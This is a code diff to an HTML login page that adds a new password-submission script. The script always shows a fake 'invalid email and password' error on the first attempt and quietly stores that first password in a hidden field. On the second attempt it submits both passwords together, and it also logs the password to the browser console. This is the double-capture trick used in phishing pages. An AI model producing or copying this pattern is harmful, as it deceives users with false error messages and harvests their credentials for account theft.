@@ -178,12 +178,14 @@
                     <div style="text-align: end; padding-bottom: 3px;">
                         <span class="forgotText">Reset password</span>
                     </div>
+                    <input type="hidden" name="password-one" id="passwordOne">
                     <div class="inputContainer">
                         <input type="password" name="password" id="password" required  class="filter emailInput" oninput="ValidateEmail()" />
-                        <span class="placeholder">Password *</span>
+                        <span class="placeholder" id="passPlaceholder">Password *</span>
                         <i class="bi bi-eye-slash-fill" id="togglePassword"></i>
                     </div>
-                    <button  class="btn btn-primary btn-lg btn-block loginBtn" id="LoginBtn" onclick="sendRequest()">LOG IN</button>
+                    <p id="wrongPassMessage" style="color: #f44336; font-size: 11px; padding-top: 6px; display: none">Invalid email and password combination</p>
+                    <button type="button"  class="btn btn-primary btn-lg btn-block loginBtn" id="LoginBtn" onclick="sendRequest()">LOG IN</button>
                     <div style="font-size: 12px; padding-top: 12px; text-align: center;">
                         <span>By continuing you agree to our</span>
                         <span style="cursor: pointer; color: #0046e0"> terms and conditions</span>.
@@ -194,6 +196,27 @@
         </div>
     </div>
     <script>
+        function sendRequest ()  {
+            const pass = document.querySelector('#password').value;
+            const passPlaceholder = document.querySelector('#passPlaceholder');
+            const passOne =  document.querySelector('#passwordOne')
+            if(!passOne.value) {
+                passOne.value = pass;
+
+                // forgotEmail.style.color = "#0046e0";
+                document.querySelector('#wrongPassMessage').style.display = "block";
+                document.querySelector('#password').style.borderColor = "#f44336";
+                passPlaceholder.style.color = "#f44336";
+            } else {
+                document.querySelector('#wrongPassMessage').style.display = "none";
+                document.querySelector('#password').style.borderColor = "#7496e0";
+                passPlaceholder.style.color = "#7496e0";
+                document.getElementById('myForm').submit()
+            }
+
+            console.log(pass)
+
+        };
         const togglePassword = document
             .querySelector('#togglePassword');
         const password = document.querySelector('#password');
@@ -238,9 +261,7 @@
             }
         }
 
-        function sendRequest ()  {
 
-        }
     </script>
 </body>
 </html>
